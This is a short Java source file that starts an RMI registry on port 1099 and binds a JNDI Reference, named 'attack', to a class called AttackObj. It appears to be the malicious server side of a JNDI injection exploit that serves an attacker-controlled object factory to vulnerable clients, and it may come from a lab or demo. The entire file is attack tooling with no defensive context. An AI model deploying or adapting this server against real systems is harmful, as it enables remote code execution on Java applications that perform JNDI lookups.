package org.example.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author i531869
 * @Date 12/21/21 2:43 PM
 * @Version 1.0
 */
public class RMIServer {
  public static void main(String[] args) {
    try {
      //create rmi registry
      LocateRegistry.createRegistry(1099);
      Registry registry = LocateRegistry.getRegistry();

      //bind reference to name
      Reference reference = new Reference("org.example.rmi.AttackObj","org.example.rmi.AttackObj",null);
      ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
      registry.bind("attack", referenceWrapper);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}
